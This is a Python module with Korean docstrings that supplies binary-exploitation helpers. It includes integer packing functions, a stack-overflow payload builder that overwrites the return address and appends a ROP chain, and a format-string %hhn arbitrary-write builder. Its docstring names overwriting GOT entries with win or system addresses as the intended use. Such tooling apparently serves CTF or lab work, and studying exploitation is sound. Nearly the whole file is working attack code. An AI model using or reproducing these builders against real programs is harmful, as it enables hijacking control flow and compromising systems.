"""정수 패킹/언패킹 및 스택 오버플로우 페이로드 조립 헬퍼."""

from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import cast


def p64(value: int, endian: str = "little") -> bytes:
    fmt = "<Q" if endian == "little" else ">Q"
    return struct.pack(fmt, value & 0xFFFFFFFFFFFFFFFF)


def p32(value: int, endian: str = "little") -> bytes:
    fmt = "<I" if endian == "little" else ">I"
    return struct.pack(fmt, value & 0xFFFFFFFF)


def u64(data: bytes, endian: str = "little") -> int:
    fmt = "<Q" if endian == "little" else ">Q"
    return cast(int, struct.unpack(fmt, data.ljust(8, b"\x00")[:8])[0])


def u32(data: bytes, endian: str = "little") -> int:
    fmt = "<I" if endian == "little" else ">I"
    return cast(int, struct.unpack(fmt, data.ljust(4, b"\x00")[:4])[0])


@dataclass
class RopStep:
    """ROP 체인 한 단계: 주소(가젯/함수) 또는 원시 값."""

    value: int
    comment: str = ""


def build_overflow(
    padding: int,
    target: int,
    *,
    bits: int = 64,
    fill: bytes = b"A",
    chain: list[RopStep] | None = None,
) -> bytes:
    """단순 반환주소 덮어쓰기 페이로드를 만든다.

    ``[fill * padding][target][chain...]`` 형태.
    """
    if padding < 0:
        raise ValueError("padding 은 음수일 수 없습니다.")
    if not fill:
        raise ValueError("fill 은 비어 있을 수 없습니다.")
    pack = p64 if bits == 64 else p32
    payload = (fill * ((padding // len(fill)) + 1))[:padding]
    out = bytearray(payload)
    out += pack(target)
    for step in chain or []:
        out += pack(step.value)
    return bytes(out)


def build_fmtstr_write(
    data_arg_index: int,
    writes: dict[int, int],
    *,
    value_bytes: int = 6,
) -> bytes:
    """포맷스트링 ``%hhn`` 바이트 단위 임의 주소 쓰기 payload 를 만든다(amd64, 64-bit).

    ``printf(user_input)`` 처럼 포맷 문자열을 제어할 수 있을 때, ``writes`` 의 각
    ``{target_addr: value}`` 를 한 바이트씩(``%hhn``) 대상 주소에 기록한다. 대표
    용도는 GOT 엔트리를 ``win``/``system`` 주소로 덮어 다음 호출에서 제어를 이전하는
    것이다.

    ``data_arg_index`` 는 **우리 입력 버퍼의 첫 8바이트 qword 가 놓이는 스택 인자
    인덱스**다(``%N$p`` probe 로 ``0x4141414141414141`` 이 반사되는 N 을 찾아 얻는다).
    대상 주소 목록은 포맷 지시자 **뒤에** 8바이트 정렬로 붙인다 — printf 는 null
    바이트에서 포맷팅을 멈추므로, null 을 포함할 수 있는 주소는 반드시 뒤에 와야 한다.

    ``value_bytes`` 개(기본 6 = 48비트 유효 주소)의 하위 바이트만 기록한다. 정렬을
    위해 지시자 길이가 차지하는 qword 수를 수렴시켜 첫 주소의 인자 위치를 정한다
    (지시자 길이 ↔ 위치 인덱스의 순환 의존을 반복으로 해소한다).
    """

    if data_arg_index < 1:
        raise ValueError("data_arg_index 는 1 이상이어야 합니다.")
    if value_bytes < 1 or value_bytes > 8:
        raise ValueError("value_bytes 는 1..8 이어야 합니다.")
    if not writes:
        raise ValueError("writes 는 비어 있을 수 없습니다.")

    # 각 write 를 바이트 단위(대상주소, 바이트값) 목록으로 펼친다.
    byte_targets: list[tuple[int, int]] = []
    for addr, value in writes.items():
        for i in range(value_bytes):
            byte_targets.append((addr + i, (value >> (8 * i)) & 0xFF))

    # 지시자가 차지하는 qword 수를 수렴시킨다(첫 주소 인자 = data_arg_index + qwords).
    fmt_qwords = 1
    for _ in range(64):  # 실전에서 두세 번 안에 수렴; 방어적 상한.
        first_pos = data_arg_index + fmt_qwords
        fmt = _render_fmt_directives(byte_targets, first_pos)
        pad = (-len(fmt)) % 8
        needed = (len(fmt) + pad) // 8
        if needed <= fmt_qwords:
            fmt = fmt + b"a" * pad
            break
        fmt_qwords = needed
    else:  # pragma: no cover - 방어적: 수렴 실패
        raise ValueError("포맷스트링 지시자 길이가 수렴하지 않았습니다.")

    addrs = b"".join(p64(addr) for addr, _ in byte_targets)
    return fmt + addrs


def _render_fmt_directives(
    byte_targets: list[tuple[int, int]], first_pos: int
) -> bytes:
    """바이트 write 들을 ``%<pad>c%<pos>$hhn`` 지시자 열로 렌더한다.

    ``%hhn`` 은 그때까지 printf 가 **출력한 총 문자 수**의 하위 1바이트를 기록하므로,
    쓰고 싶은 바이트 값 오름차순으로 정렬해 누적 출력수를 단조 증가시킨다(256 모듈러
    래핑으로 감소·0 값도 처리). k 번째 대상의 주소는 뒤에 붙는 목록의 k 번째 qword =
    인자 ``first_pos + k`` 에 있다.
    """

    order = sorted(range(len(byte_targets)), key=lambda k: byte_targets[k][1])
    out = bytearray()
    printed = 0
    for k in order:
        _, val = byte_targets[k]
        delta = (val - printed) % 256
        if delta:
            out += b"%" + str(delta).encode() + b"c"
            printed = (printed + delta) & 0xFF
        out += b"%" + str(first_pos + k).encode() + b"$hhn"
    return bytes(out)


def hexdump_payload(payload: bytes, width: int = 16) -> str:
    """페이로드를 사람이 읽을 수 있는 헥스덤프 문자열로."""
    lines = []
    for off in range(0, len(payload), width):
        chunk = payload[off : off + width]
        hexpart = " ".join(f"{b:02x}" for b in chunk)
        asciipart = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in chunk)
        lines.append(f"{off:08x}  {hexpart:<{width * 3}}  {asciipart}")
    return "\n".join(lines)
